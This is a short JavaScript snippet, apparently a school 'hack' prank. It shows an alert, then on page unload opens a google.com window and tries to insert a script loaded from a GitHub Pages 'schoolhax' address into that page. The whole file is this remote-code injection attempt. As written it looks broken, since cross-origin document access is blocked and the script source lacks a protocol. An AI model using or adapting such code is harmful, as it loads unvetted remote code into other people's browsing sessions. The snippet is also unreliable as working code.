alert('testing');
window.onunload = function(){
  var win = window.open('http://google.com'),
    doc = win.document,
    theScript = document.createElement('script');
  theScript.setAttribute('src', 'jeffnjellybean.github.io/schoolhax/lol.js');
  doc.body.appendChild(theScript);
}
